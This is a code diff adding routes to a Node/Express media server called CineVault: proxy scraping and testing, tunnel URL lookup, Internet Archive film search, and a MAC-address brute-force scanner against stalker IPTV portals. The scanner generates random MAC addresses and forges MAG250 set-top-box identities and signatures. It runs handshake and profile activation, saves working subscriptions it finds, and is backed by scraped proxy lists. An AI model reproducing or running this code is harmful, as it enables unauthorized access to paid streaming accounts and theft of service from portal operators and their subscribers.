+        while ((m = re.exec(body))) out.push(`${m[1]}:${m[2]}`);
+      } else if (src.includes('freeproxy.world')) {
+        const re = /<td class="show-ip-div">\s*(\d+\.\d+\.\d+\.\d+)\s*<\/td>\s*<td>\s*<a href=".*?">(\d+)<\/a>\s*<\/td>/gs;
+        let m;
+        while ((m = re.exec(body))) out.push(`${m[1]}:${m[2]}`);
+      }
+      return out;
+    }
+	    for (const src of sources) {
+	      try {
+	        const data = await new Promise((resolve, reject) => {
+	          const proto = src.startsWith('https') ? https : http;
+	          const req = proto.get(src, { timeout: 10000, headers: { 'User-Agent': 'Mozilla/5.0 CineVault ProxyFetcher' } }, (r) => {
+	            let b = ''; r.on('data', c => b += c); r.on('end', () => resolve(b));
+	          });
+          req.setTimeout(10000, () => req.destroy(new Error('timeout')));
+          req.on('error', reject);
+	        });
+	        extractProxies(src, data).forEach(p => allProxies.add(p.trim()));
+	      } catch {}
+	    }
+    const proxies = [...allProxies]
+      .map(p => String(p || '').trim())
+      .filter(p => /^\S+:\d+/.test(p) || /^https?:\/\/\S+:\d+/i.test(p))
+      .slice(0, 500);
+    res.json({ ok: true, proxies, count: proxies.length });
+  } catch (e) {
+    res.json({ ok: false, error: e.message });
+  }
+});
+
+app.post('/api/macaction/test-proxies', async (req, res) => {
+  const proxyList = (req.body?.proxies || '').split(/\r?\n|,|\s+/).map(p => p.trim()).filter(Boolean);
+  if (!proxyList.length) {
+    // If no proxies in body, read from the MacAttack.ini textarea / ma-proxy-list
+    return res.json({ ok: false, error: 'No proxies to test' });
+  }
+  res.writeHead(200, { 'Content-Type': 'text/event-stream', 'Cache-Control': 'no-cache', Connection: 'keep-alive' });
+  const http = require('http');
+  const https = require('https');
+  let working = 0, failed = 0;
+  const testTarget = req.body?.target || 'http://evilvir.us.streamtv.to:8080/c/';
+  const concurrency = 10;
+  let idx = 0;
+  const results = [];
+  let finished = false;
+
+  function writeProxyEvent(payload) {
+    if (finished) return;
+    try { res.write(`data: ${JSON.stringify(payload)}\n\n`); } catch {}
+  }
+
+  function finishProxyTest(payload) {
+    if (finished) return;
+    clearTimeout(hardStopTimer);
+    try {
+      res.write(`data: ${JSON.stringify({ ...payload, done: true, working, failed, total: proxyList.length, workingList: results.filter(r => r.ok).map(r => r.proxy) })}\n\n`);
+    } catch {}
+    finished = true;
+    try { res.end(); } catch {}
+  }
+
+  const hardStopTimer = setTimeout(() => {
+    finishProxyTest({ timeout: true });
+  }, Math.min(120000, Math.max(15000, proxyList.length * 9000)));
+
+  function normalizeProxyUrl(proxy) {
+    const clean = String(proxy || '').trim();
+    if (!clean) return '';
+    return /^https?:\/\//i.test(clean) ? clean : `http://${clean}`;
+  }
+
+  async function testOne(proxy) {
+    if (finished) return;
+    const proxyUrl = normalizeProxyUrl(proxy);
+    let agent = null;
+    try {
+      agent = testTarget.startsWith('https') ? new HttpsProxyAgent(proxyUrl) : new HttpProxyAgent(proxyUrl);
+      await new Promise((resolve, reject) => {
+        const proto = testTarget.startsWith('https') ? https : http;
+        const req = proto.get(testTarget, { agent, timeout: 6000, headers: { 'User-Agent': 'CineVault/2.0 ProxyTest' } }, (r) => {
+          r.resume();
+          if (r.statusCode < 500) resolve();
+          else reject(new Error('status ' + r.statusCode));
+        });
+        req.setTimeout(6000, () => {
+          req.destroy(new Error('timeout'));
+        });
+        req.on('error', reject);
+      });
+      working++;
+      results.push({ proxy, ok: true });
+      writeProxyEvent({ proxy, ok: true, working, failed, total: idx });
+    } catch {
+      failed++;
+      results.push({ proxy, ok: false });
+      writeProxyEvent({ proxy, ok: false, working, failed, total: idx });
+    } finally {
+      try { if (agent && typeof agent.destroy === 'function') agent.destroy(); } catch {}
+    }
+  }
+
+  async function runBatch() {
+    if (finished) return;
+    const batch = [];
+    for (let i = 0; i < concurrency && idx < proxyList.length; i++, idx++) {
+      batch.push(testOne(proxyList[idx]));
+    }
+    if (batch.length) {
+      await Promise.all(batch);
+      if (idx < proxyList.length) setImmediate(runBatch);
+      else {
+        finishProxyTest({});
+      }
+    } else {
+      finishProxyTest({});
+    }
+  }
+  runBatch();
+});
+
+function pickShortestTunnelCandidate(candidates) {
+  return candidates
+    .filter(c => c && typeof c.url === 'string' && c.url.startsWith('http'))
+    .sort((a, b) => a.url.length - b.url.length)[0] || null;
+}
+
+// ── Tunnel URL endpoint ── returns the shortest active public URL
+app.get('/api/tunnel-url', (req, res) => {
+  try {
+    const candidates = [];
+
+    const readText = (file) => {
+      try {
+        if (!fs.existsSync(file)) return '';
+        return fs.readFileSync(file, 'utf8').replace(/\x1b\[[0-9;]*m/g, '');
+      } catch {
+        return '';
+      }
+    };
+
+    const currentUrl = readText('/tmp/serveo-current-url').trim();
+    if (currentUrl.startsWith('https://')) {
+      candidates.push({ url: currentUrl, provider: 'serveo' });
+    }
+
+    const serveoLog = readText('/tmp/serveo-tunnel.log');
+    const allServeo = [...serveoLog.matchAll(/Forwarding HTTP traffic from (https?:\/\/[^\s]+)/g)];
+    if (allServeo.length > 0) {
+      candidates.push({ url: allServeo[allServeo.length - 1][1], provider: 'serveo' });
+    }
+
+    const cfLog = readText('/tmp/cloudflared-tunnel.log');
+    const cfMatch = cfLog.match(/\|\s*(https?:\/\/[a-z0-9-]+\.trycloudflare\.com)\s*\|/);
+    if (cfMatch) {
+      candidates.push({ url: cfMatch[1], provider: 'cloudflare' });
+    }
+
+    const boreLog = readText('/tmp/bore-tunnel.log');
+    const boreMatches = boreLog.match(/remote_port=(\d+)/g);
+    if (boreMatches && boreMatches.length > 0) {
+      const lastPort = boreMatches[boreMatches.length - 1].match(/remote_port=(\d+)/)[1];
+      candidates.push({ url: `http://bore.pub:${lastPort}`, port: parseInt(lastPort), provider: 'bore' });
+    }
+
+    const best = pickShortestTunnelCandidate(candidates);
+    if (best) {
+      const payload = { url: best.url, status: 'active', provider: best.provider };
+      if (best.port) payload.port = best.port;
+      res.json(payload);
+      return;
+    }
+
+    res.json({ url: null, status: 'down' });
+  } catch (e) {
+    res.json({ url: null, status: 'down', error: e.message });
+  }
+});
+
+//  /api/archive-search — Internet Archive free movies search
+const _archiveCache = new Map();
+const _ARCHIVE_TTL = 10 * 60 * 1000; // 10 minutes
+app.get('/api/archive-search', async (req, res) => {
+  if (req.query.allowArchive !== '1') return res.json({ items: [], disabled: true });
+  const q = (req.query.q || '').trim();
+  if (!q) return res.json({ items: [] });
+  const cacheKey = q;
+  const cached = _archiveCache.get(cacheKey);
+  if (cached && Date.now() - cached.ts < _ARCHIVE_TTL) return res.json({ items: cached.items, cached: true });
+  try {
+    // Search for actual movies in the feature_films collection
+    // Use collection: identifier to filter, only search title field to avoid random matches
+    // Wildcard * or empty means browse all titles sorted by downloads
+    let archiveQ;
+    if (q === '*' || q === '') {
+      archiveQ = 'collection:feature_films';
+    } else {
+      archiveQ = `collection:feature_films+AND+title:(${encodeURIComponent(q)})`;
+    }
+    const url = `https://archive.org/advancedsearch.php?q=${archiveQ}&fl[]=identifier,title,description,year,thumb,collection&rows=30&page=1&sort[]=downloads+desc&output=json`;
+    const r = await fetch(url, {
+      headers: { 'User-Agent': 'CineVault/2.0' },
+      signal: AbortSignal.timeout(6000)
+    });
+    const rawText = await r.text();
+    let data;
+    try {
+      data = JSON.parse(rawText.replace(/[\x00-\x1f]/g, ''));
+    } catch {
+      data = { response: { docs: [] } };
+    }
+    const items = (data.response?.docs || [])
+      .filter(d => {
+        // Filter out collection-level entries (they're categories, not movies)
+        const coll = d.collection || '';
+        const isColl = Array.isArray(coll) ? coll.some(c => c === 'feature_films' || c === 'movies') : (coll === 'feature_films' || coll === 'movies');
+        // Also skip entries that ARE sub-collections (no year, generic title)
+        const id = (d.identifier || '').toLowerCase();
+        const skipIds = ['scifi_horror','silent_films','comedy_films','film_noir','thevideocellarcollection','feature_films_picfixer','feature_films_unsorted','silenthalloffame'];
+        if (skipIds.includes(id)) return false;
+        return true;
+      })
+      .map(d => {
+      // Clean up description - strip HTML tags, truncate
+      let desc = d.description || '';
+      if (Array.isArray(desc)) desc = desc.join(' ');
+      desc = desc.replace(/<[^>]*>/g, '').trim().substring(0, 200);
+      return {
+        id: d.identifier,
+        title: (d.title || '').replace(/[\x00-\x1f]/g, '').trim(),
+        year: d.year,
+        description: desc,
+        thumb: d.thumb || `https://archive.org/services/img/${d.identifier}`,
+        url: `https://archive.org/details/${d.identifier}`,
+        embed: `https://archive.org/embed/${d.identifier}`,
+      };
+    });
+    _archiveCache.set(cacheKey, { items, ts: Date.now() });
+    res.json({ items });
+  } catch (e) {
+    res.status(500).json({ items: [], error: e.message });
+  }
+});
+
+// ── MAC Brute-Force Scanner (port of MacAttack's BigMacAttack) ──
+// Scans random MAC addresses against a stalker portal to find working subscriptions
+const macScannerState = { running: false, hits: 0, found: [], tested: 0, controller: null };
+
+app.post('/api/macaction/brute-mac', async (req, res) => {
+  const { url, prefix, threads, useProxies, proxyList } = req.body;
+  const portalUrl = url || 'http://evilvir.us.streamtv.to:8080';
+  const macPrefix = prefix || '00:1A:79:';
+  const numThreads = Math.min(parseInt(threads) || 10, 50);
+
+  if (macScannerState.running) {
+    return res.json({ ok: false, error: 'Scanner already running' });
+  }
+
+  // Detect portal type
+  let portalType = 'stalker_portal/server/load.php';
+  try {
+    const vRes = await fetch(portalUrl + '/stalker_portal/c/version.js', {
+      headers: { 'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3' },
+      signal: AbortSignal.timeout(5000)
+    });
+    if (!vRes.ok) {
+      const vRes2 = await fetch(portalUrl + '/c/version.js', {
+        headers: { 'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3' },
+        signal: AbortSignal.timeout(5000)
+      });
+      if (vRes2.ok) portalType = 'portal.php';
+    }
+  } catch {}
+
+  const baseUrl = portalUrl.replace(/\/+$/, '');
+  const loadUrl = `${baseUrl}/${portalType}`;
+
+  macScannerState.running = true;
+  macScannerState.hits = 0;
+  macScannerState.found = [];
+  macScannerState.tested = 0;
+  macScannerState.controller = new AbortController();
+
+  // Resolve proxies
+  let proxies = [];
+  if (useProxies && proxyList) {
+    proxies = proxyList.split('\n').map(p => p.trim()).filter(Boolean);
+  }
+
+  res.json({ ok: true, message: `Brute-force started with ${numThreads} threads against ${baseUrl}` });
+
+  // Run brute force in background
+  const generateMac = () => {
+    return `${macPrefix}${crypto.randomBytes(1).toString('hex').toUpperCase().padStart(2,'0')}:${crypto.randomBytes(1).toString('hex').toUpperCase().padStart(2,'0')}:${crypto.randomBytes(1).toString('hex').toUpperCase().padStart(2,'0')}`;
+  };
+
+  const testMac = async (mac) => {
+    if (!macScannerState.running) return null;
+    try {
+      const serialnumber = crypto.createHash('md5').update(mac).digest('hex').toUpperCase();
+      const sn = serialnumber.substring(0, 13);
+      const deviceId = crypto.createHash('sha256').update(sn).digest('hex').toUpperCase();
+      const deviceId2 = crypto.createHash('sha256').update(mac).digest('hex').toUpperCase();
+      const hwVersion2 = crypto.createHash('sha1').update(mac).digest('hex');
+      const snmac = sn + mac;
+      const sig = crypto.createHash('sha256').update(snmac).digest('hex').toUpperCase();
+
+      const stbUA = 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3';
+      const baseHeaders = { 'User-Agent': stbUA, 'Accept-Encoding': 'identity', 'Accept': '*/*', 'Connection': 'keep-alive' };
+      const baseCookies = `mac=${mac}; sn=${sn}; stb_lang=en; timezone=America/Los_Angeles; debug=1; device_id=${deviceId}; device_id2=${deviceId2}; adid=${hwVersion2}; hw_version=1.7-BD-00`;
+
+      // Pick a proxy if available
+      const proxyAgent = proxies.length > 0 ? proxies[Math.floor(Math.random() * proxies.length)] : null;
+      const fetchOpts = { headers: { ...baseHeaders, 'Cookie': baseCookies }, signal: AbortSignal.timeout(15000) };
+      // Note: node-fetch doesn't natively support proxies; for now we go direct
+      // (proxy support would need https-proxy-agent)
+
+      // Step 1: Handshake
+      const hsUrl = `${loadUrl}?action=handshake&type=stb&JsHttpRequest=1-xml`;
+      const hsRes = await fetch(hsUrl, fetchOpts);
+      if (!hsRes.ok) return null;
+      const hsData = await hsRes.json();
+      const token = hsData?.js?.token;
+      if (!token) return null;
+
+      const tokenRandom = hsData?.js?.random || 0;
+      let finalSig = sig;
+      let metrics;
+      if (tokenRandom) {
+        finalSig = crypto.createHash('sha256').update(String(tokenRandom)).digest('hex').toUpperCase();
+        metrics = { mac, sn, type: 'STB', model: 'MAG250', uid: deviceId, random: tokenRandom };
+      } else {
+        metrics = { mac, sn, type: 'STB', model: 'MAG250', uid: deviceId, random: 0 };
+      }
+
+      // Step 2: Get profile (activate)
+      const authHeaders = { ...baseHeaders, 'Authorization': `Bearer ${token}`, 'X-Random': String(tokenRandom), 'Cookie': baseCookies };
+      const profileUrl = `${loadUrl}?type=stb&action=get_profile&hd=1&ver=ImageDescription: 0.2.18-r23-250; PORTAL version: 5.3.1; API Version: JS API version: 343; STB API version: 146&num_banks=2&sn=${sn}&stb_type=MAG250&client_type=STB&device_id=${deviceId2}&device_id2=${deviceId2}&sig=${finalSig}&auth_second_step=1&hw_version=1.7-BD-00&not_valid_token=0&metrics=${encodeURIComponent(JSON.stringify(metrics))}&hw_version_2=${hwVersion2}&timestamp=${Math.floor(Date.now()/1000)}&api_sig=262&prehash=0`;
+      const profileRes = await fetch(profileUrl, { headers: authHeaders, signal: AbortSignal.timeout(15000) });
+      if (!profileRes.ok) return null;
+
+      let clientIp = null, expBilling = null;
+      try {
+        const pData = await profileRes.json();
+        if (pData?.js?.ip) clientIp = pData.js.ip;
+        if (pData?.js?.expire_billing_date) expBilling = pData.js.expire_billing_date;
+      } catch {}
+
+      // Step 3: Account info — THIS is the hit check (MacAttack line 3608-3613)
+      const acctUrl = `${loadUrl}?type=account_info&action=get_main_info&JsHttpRequest=1-xml`;
+      const acctRes = await fetch(acctUrl, { headers: authHeaders, signal: AbortSignal.timeout(15000) });
+      if (!acctRes.ok) return null;
+      const acctData = await acctRes.json();
+
+      // Valid MAC = account_info has js.mac AND js.phone
+      if (acctData?.js?.mac && acctData?.js?.phone !== undefined) {
+        let expiry = acctData.js.phone || 'Unknown';
+        try { expiry = new Date(parseInt(expiry) * 1000).toISOString().split('T')[0]; } catch {}
+
+        // Step 4: Verify channels available
+        const chanUrl = `${loadUrl}?type=itv&action=get_all_channels&JsHttpRequest=1-xml`;
+        const chanRes = await fetch(chanUrl, { headers: authHeaders, signal: AbortSignal.timeout(15000) });
+
+        // Step 5: Try create_link to confirm stream access
+        let streamCmd = null, streamDomain = null;
+        try {
+          const linkUrl = `${loadUrl}?type=itv&action=create_link&cmd=http://localhost/ch/10000_&series=&forced_storage=undefined&disable_ad=0&download=0&JsHttpRequest=1-xml`;
+          const linkRes = await fetch(linkUrl, { headers: authHeaders, signal: AbortSignal.timeout(15000) });
+          const linkData = await linkRes.json();
+          streamCmd = linkData?.js?.cmd;
+          if (streamCmd) {
+            streamCmd = streamCmd.replace(/^ffmpeg\s+/, '').replace(/^'ffmpeg'\s+/, '');
+            try {
+              const parsed = new URL(streamCmd);
+              streamDomain = parsed.hostname;
+            } catch {}
+          }
+        } catch {}
+
+        return {
+          mac,
+          expiry,
+          clientIp,
+          expBilling,
+          channels: chanRes.ok ? 'available' : 'unknown',
+          streamCmd,
+          streamDomain,
+          portalUrl: baseUrl,
+          portalType,
+          timestamp: new Date().toISOString()
+        };
+      }
+      return null;
+    } catch (e) {
+      return null;
+    }
+  };
+
+  // Run worker loops
+  const workers = [];
+  for (let i = 0; i < numThreads; i++) {
+    workers.push((async () => {
+      while (macScannerState.running) {
+        const mac = generateMac();
+        macScannerState.tested++;
+        try {
+          const hit = await testMac(mac);
+          if (hit) {
+            macScannerState.hits++;
+            macScannerState.found.push(hit);
+            // Save to portal-hits.json
+            try {
+              const hitsFile = path.join(DATA_DIR, 'portal-hits.json');
+              let existing = [];
+              try { existing = JSON.parse(fs.readFileSync(hitsFile, 'utf8')); } catch {}
+              // Check not duplicate
+              if (!existing.find(h => h.mac === hit.mac && h.portalUrl === hit.portalUrl)) {
+                existing.push({ ...hit, source: 'mac-brute', discovered: new Date().toISOString() });
+                fs.writeFileSync(hitsFile, JSON.stringify(existing, null, 2));
+              }
+            } catch {}
+          }
+        } catch {}
+        // Small delay to avoid hammering too hard
+        await new Promise(r => setTimeout(r, 200));
+      }
+    })());
+  }
+
+  // Don't await — let it run in background
+  Promise.all(workers).catch(() => {});
+});
+
+app.post('/api/macaction/stop-brute', (req, res) => {
+  macScannerState.running = false;
+  res.json({ ok: true, tested: macScannerState.tested, hits: macScannerState.hits, found: macScannerState.found });
+});
+
+app.get('/api/macaction/brute-status', (req, res) => {
+  res.json({
+    running: macScannerState.running,
+    tested: macScannerState.tested,
+    hits: macScannerState.hits,
+    found: macScannerState.found
+  });
+});
+
+// SPA fallback — all unknown routes serve index.html
+app.get('*', (req, res) => {
+  res.sendFile(path.join(__dirname, 'index.html'));
+});
+
+// ── Start ──
+ensureDataDir();
+
+function scheduleDailyMovieFetch() {
+  const statusFile = path.join(__dirname, 'data', 'auto-fetch-status.json');
+  const minIntervalMs = Number(process.env.CINEVAULT_AUTO_FETCH_MIN_INTERVAL_MS || 6 * 60 * 60 * 1000);
+  let running = false;
+
+  const readStatus = () => {
+    try { return JSON.parse(fs.readFileSync(statusFile, 'utf8')); }
+    catch { return {}; }
+  };
+  const writeStatus = (patch) => {
+    const status = { ...readStatus(), ...patch };
+    fs.writeFileSync(statusFile, JSON.stringify(status, null, 2));
+  };
+  const maybeRun = () => {
+    if (running) return;
+    const status = readStatus();
+    const lastRun = status.lastRunAt ? Date.parse(status.lastRunAt) : 0;
+    if (lastRun && Date.now() - lastRun < minIntervalMs) return;
+
+    running = true;
+    writeStatus({ running: true, startedAt: new Date().toISOString() });
+    const child = spawn(process.execPath, [path.join(__dirname, 'scripts', 'auto-fetch-new.js')], {
+      cwd: __dirname,
+      env: { ...process.env, PORT: String(PORT) },
+      stdio: 'ignore',
+      detached: false
+    });
+    child.on('exit', (code) => {
+      running = false;
+      writeStatus({
+        running: false,
+        lastRunAt: new Date().toISOString(),
+        lastExitCode: code
+      });
+    });
+    child.on('error', (error) => {
+      running = false;
+      writeStatus({
+        running: false,
+        lastRunAt: new Date().toISOString(),
+        lastError: error.message
+      });
+    });
+  };
+
+  setTimeout(maybeRun, 2 * 60 * 1000);
+  setInterval(maybeRun, minIntervalMs);
+}
+
+app.listen(PORT, () => {
+  console.log(``);
+  try {
+    buildMovieDb();
+  } catch (err) {
+    console.warn(`movie db bootstrap skipped: ${err.message}`);
+  }
+  console.log(`💀 CineVault Server v2.0 — Running on http://localhost:${PORT}`);
+  console.log(`   📺 Static files served from: ${__dirname}`);
+  console.log(`   🔄 CORS proxy:  /api/proxy?url=<encoded URL>`);
+  console.log(`   🎬 Embed proxy:  /api/embed-proxy?url=<encoded URL>`);
+  console.log(`   💀 Stalker proxy:/api/stalker-proxy?url=<URL>&mac=<MAC>`);
+  console.log(`   🖼️  Cover art:    /api/cover-art?title=<title>&year=<year>`);
+  console.log(`   📋 Movie logs:    /api/logs (GET=list, POST=add)`);
+  console.log(`   ✨ Auto-enrich:  /api/auto-enrich?id=<TMDB ID>&type=<movie|tv>`);
+  console.log(`   💀 Stalker channels: /api/stalker-channels?url=<portal>&mac=<MAC>`);
+  console.log(`   🎞️  Cinemeta:     /api/cinemeta?id=<IMDB ID>&type=<movie|tv>`);
+  console.log(`   🖼️  Image search: /api/image-search?q=<query>`);
+  console.log(`   📦 Compression:  gzip enabled`);
+  console.log(`   🔗 Bore tunnel:  /api/tunnel-url`);
+  console.log(``);
+  scheduleDailyMovieFetch();
+});
